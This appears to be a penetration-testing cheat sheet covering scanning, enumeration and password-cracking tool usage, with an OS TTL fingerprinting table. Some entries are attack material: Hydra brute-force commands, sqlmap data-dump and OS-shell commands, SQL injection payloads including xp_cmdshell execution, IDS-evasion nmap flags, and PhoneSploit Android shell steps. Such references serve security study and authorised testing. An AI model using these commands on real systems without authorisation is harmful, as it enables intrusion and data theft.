### AD Explorer ### WINDOWS
//GUI

### ADVANCED IP SCANNER ### WINDOWS
//GUI

### ANDROID ADB ###
adb connect IP:5555
adb devices -l
adb shell

### ANDROID PHONESPLOIT ###
sudo apt install android-tools-adb android-tools-fastboot
sudo apt install adb

git clone https://github.com/aerosol-can/PhoneSploit

python3 phonesploit.py
3 (Connect to new phone)
Add IP address of android device
4 (Access shell on phone)
IP address again of android device

### DIG ###
dig ns domain //DNS enumeration
dig @nshostname domain axfr //Zone transfer

### ENUM4LINUX ###
enum4linux -u USERNAME -p PASSWORD -U IP // Users Enumeration
enum4linux -u USERNAME -p PASSWORD -o IP // OS Enumeration
enum4linux -u USERNAME -p PASSWORD -P IP // Password Policy Information
enum4linux -u USERNAME -p PASSWORD -G IP // Groups Information
enum4linux -u USERNAME -p PASSWORD -S IP // Share Policy Information (SMB Shares Enumeration)

### FTP ###
ftp IP

### GLOBAL NETWORK INVENTORY ### WINDOWS
//GUI

### HASHES ###
https://crackstation.net/ //hash cracking
https://hashes.com/en/decrypt/hash //hash cracking
https://www.onlinehashcrack.com/hash-identification.php //hash identification

### HASHCAT ###

Hashcat -a ATTACK_TYPE -m HASH_TYPE HASHLIST /WORDLIST
-a 0 | Straight
-a 1 | Combination
-a 3 | Brute-force
-a 6 | Hybrid Wordlist + Mask
-a 7 | Hybrid Mask + Wordlist
-a 9 | Association

### HPING ###
hping3 -A IP -p PORT -c PACKET_COUNT //ACK SCAN
hping3 scan_mode 0-100 -S IP -V // -V=Verbose -S=SYN

scan_mode:
// -0 --rawip
// -1 --icmp
// -2 --udp
// -8 --scan

### HYDRA ###
hydra -L LIST -P LIST PROTOCOL://IP //PROTOCOL=ftp, rdp
hydra -l USERNAME -p PASSWORD PROTOCOL://IP //PROTOCOL=ftp, rdp
hydra -L LIST -P LIST IP PROTOCOL
hydra -l USERNAME -p PASSWORD IP PROTOCOL
hydra -l USERNAME -P LIST IP http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V //Post Web Form
hydra -P snmp-community-strings.txt example.com snmp

### JOHN THE RIPPER ###
john hashfile/hash
john hashfile/hash --wordlist=WORDLIST
john --show hashfile/hash

### METASPLOIT ###

# msfdb init
# service postgresql start
> nmap -Pn -sS -A -oX Test IP/IP_RANGE
> db_import Test
> hosts //hosts listing
> services //services (ports, proto, name, state, info) listing
> hosts -o PATH_TO_FILE.csv //saving output to file

use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/ftp/ftp_version

### nbtstat ### WINDOWS
nbtstat -a IP //-a = displays the NetBIOS name table of remote host, IP = remote host IP
nbtstat -c //-c =	Displays the contents of the NetBIOS name cache, the table of NetBIOS names and their resolved IP addresses

### net ### WINDOWS
net localgroup
net share
net use 
net user
net user /domain
net user [username]
net user [username] /domain

### NETBIOS ENUMERATOR ### WINDOWS
// GUI

### NIKTO ###
nikto -H //displays available options
nikto -h DOMAIN -Tuning x //-x = include all options except specified
nikto -h DOMAIN -Cgidirs all
nikto -h DOMAIN -o FILENAME -F txt //saves to file

### NMAP / ZENMAP ###
Scan a single IP nmap 192.168.1.1
Scan a host nmap www.testhostname.com
Scan a range of IPs nmap 192.168.1.1-20
Scan a subnet nmap 192.168.1.0/24
Scan targets from a text file nmap -iL list-of-ips.txt
Scan a single Port nmap -p 22 192.168.1.1
Scan a range of ports nmap -p 1-100 192.168.1.1
Scan 100 most common ports (Fast) nmap -F 192.168.1.1
Scan all 65535 ports nmap -p- 192.168.1.1
Scan using TCP connect nmap -sT 192.168.1.1
Scan using TCP SYN scan (default) nmap -sS 192.168.1.1
Scan UDP ports nmap -sU -p 123,161,162 192.168.1.1
Scan selected ports - ignore discovery nmap -Pn -F 192.168.1.1
Detect OS and Services nmap -A 192.168.1.1
Standard service detection nmap -sV 192.168.1.1
More aggressive Service Detection nmap -sV --version-intensity 5 192.168.1.1
Lighter banner grabbing detection nmap -sV --version-intensity 0 192.168.1.1
Save default output to file nmap -oN outputfile.txt 192.168.1.1
Save results as XML nmap -oX outputfile.xml 192.168.1.1
Save results in a format for grep nmap -oG outputfile.txt 192.168.1.1
Save in all formats nmap -oA outputfile 192.168.1.1
Scan using default safe scripts nmap -sV -sC 192.168.1.1
Get help for a script nmap --script-help=ssl-heartbleed
Scan using a specific NSE script nmap -sV -p 443 –script=ssl-heartbleed.nse 192.168.1.1
Scan with a set of scripts nmap -sV --script=smb* 192.168.1.1
Gather page titles from HTTP services nmap --script=http-title 192.168.1.0/24
Get HTTP headers of web services nmap --script=http-headers 192.168.1.0/24
Find web apps from known paths nmap --script=http-enum 192.168.1.0/24
nmap --script smb-os-discovery.nse IP
nmap IP --data-string "STRING" //scanning beyond ids/ips/firewall
nmap IP --data HEX // HEX=0xdeadbeef
nmap --data-length LENGTH IP
nmap --randomize-hosts IP
nmap --badsum IP

nmap -sV -v --script nbstat.nse IP
nmap -sU -p 137 --script nbstat.nse IP //NetBIOS enumeration

nmap -sU -p 161 IP //SNMP

nmap -p 2049 IP //NFS enumeration

### NETDISCOVER ###
netdiscover -r IP/MASK

### NETWORK TOPOLOGY MAPPER ### WINDOWS
//network mapping tool - GUI

### RESPONDER ###
git clone https://github.com/SpiderLabs/Responder

responder -I INTERFACE
usr\share\responder\logs //logs location

### RPCSCAN ###
github clone https://github.com/hegusung/RPCScan

python3 rpc-scan.py IP --rpc

### SMB ###
smbmap -H IP -R
smbclient -L IP
smbclient \\\\IP\\share

### SNMP-CHECK ###
snmp-check IP //SNMP enumeration

### SNOW ###
SNOW.EXE -C -p PASSWORD FILE

### SSH ###
ssh LOGIN@IP

### SQLMAP ###
SQLMAP Extract DBS
sqlmap -u “http://www.example.com/viewprofile.aspx?id=1” --cookie="cookies xxx" --dbs

Extract Tables
sqlmap -u “http://www.example.com/viewprofile.aspx?id=1” --cookie="cookies xxx" -D DataBase --tables

Extract Columns
sqlmap -u “http://www.example.com/viewprofile.aspx?id=1” --cookie="cookies xxx" -D DataBase -T TableName --columns

Dump Data
sqlmap -u “http://www.example.com/viewprofile.aspx?id=1” --cookie="cookies xxx" -D DataBase -T TableName --dump

OS Shell to execute commands
sqlmap -u “http://www.example.com/viewprofile.aspx?id=1” --cookie="cookies xxx" --os-shell

Login bypass
blah' or 1=1 --

Insert data into DB from login
blah';insert into login values ('john','apple123');

Create database from login
blah';create database mydatabase;

Execute cmd from login
blah';exec master..xp_cmdshell 'ping www.example.com -l 65000 -t'; --

### SUPERENUM###
git clone https://github.com/p4pentest/SuperEnum

./superenum

### TELNET ###
telnet IP

### WPSCAN ###
wpscan --url URL -u USERNAME -P PASSWORD/LIST
wpscan --url URL --enumerate u (user enumeration)

########################################################

### TTL ###

Device / OS	Version	Protocol	TTL
AIX		TCP	60
AIX		UDP	30
Android	3.2.1	TCP and ICMP	64
Android	5.1.1	TCP and ICMP	64
AIX	3.2, 4.1	ICMP	255
BSDI	BSD/OS 3.1 and 4.0	ICMP	255
Compa	Tru64 v5.0	ICMP	64
Cisco		ICMP	254
DEC Pathworks	V5	TCP and UDP	30
Foundry		ICMP	64
FreeBSD	2.1R	TCP and UDP	64
FreeBSD	3.4, 4.0	ICMP	255
FreeBSD	5	ICMP	64
HP-UX	9.0x	TCP and UDP	30
HP-UX	10.01	TCP and UDP	64
HP-UX	10.2	ICMP	255
HP-UX	11	ICMP	255
HP-UX	11	TCP	64
Irix	5.3	TCP and UDP	60
Irix	6.x	TCP and UDP	60
Irix	6.5.3, 6.5.8	ICMP	255
juniper		ICMP	64
MPE/IX (HP)		ICMP	200
Linux	2.0.x kernel	ICMP	64
Linux	2.2.14 kernel	ICMP	255
Linux	2.4 kernel	ICMP	255
Linux	Red Hat 9	ICMP and TCP	64
MacOS/MacTCP	2.0.x	TCP and UDP	60
MacOS/MacTCP	X (10.5.6)	ICMP/TCP/UDP	64
NetBSD		ICMP	255
Netgear FVG318		ICMP and UDP	64
OpenBSD	2.6 & 2.7	ICMP	255
OpenVMS	07.01.2002	ICMP	255
OS/2	TCP/IP 3.0		64
OSF/1	V3.2A	TCP	60
OSF/1	V3.2A	UDP	30
Solaris	2.5.1, 2.6, 2.7, 2.8	ICMP	255
Solaris	2.8	TCP	64
Stratus	TCP_OS	ICMP	255
Stratus	TCP_OS (14.2-)	TCP and UDP	30
Stratus	TCP_OS (14.3+)	TCP and UDP	64
Stratus	STCP	ICMP/TCP/UDP	60
SunOS	4.1.3/4.1.4	TCP and UDP	60
SunOS	5.7	ICMP and TCP	255
Ultrix	V4.1/V4.2A	TCP	60
Ultrix	V4.1/V4.2A	UDP	30
Ultrix	V4.2 – 4.5	ICMP	255
VMS/Multinet		TCP and UDP	64
VMS/TCPware		TCP	60
VMS/TCPware		UDP	64
VMS/Wollongong	1.1.1.1	TCP	128
VMS/Wollongong	1.1.1.1	UDP	30
VMS/UCX		TCP and UDP	128
Windows	for Workgroups	TCP and UDP	32
Windows	95	TCP and UDP	32
Windows	98	ICMP	32
Windows	98, 98 SE	ICMP	128
Windows	98	TCP	128
Windows	NT 3.51	TCP and UDP	32
Windows	NT 4.0	TCP and UDP	128
Windows	NT 4.0 SP5-		32
Windows	NT 4.0 SP6+		128
Windows	NT 4 WRKS SP 3, SP 6a	ICMP	128
Windows	NT 4 Server SP4	ICMP	128
Windows	ME	ICMP	128
Windows	2000 pro	ICMP/TCP/UDP	128
Windows	2000 family	ICMP	128
Windows	Server 2003		128
Windows	XP	ICMP/TCP/UDP	128
Windows	Vista	ICMP/TCP/UDP	128
Windows	7	ICMP/TCP/UDP	128
Windows	Server 2008	ICMP/TCP/UDP	128
Windows	10	ICMP/TCP/UDP	128
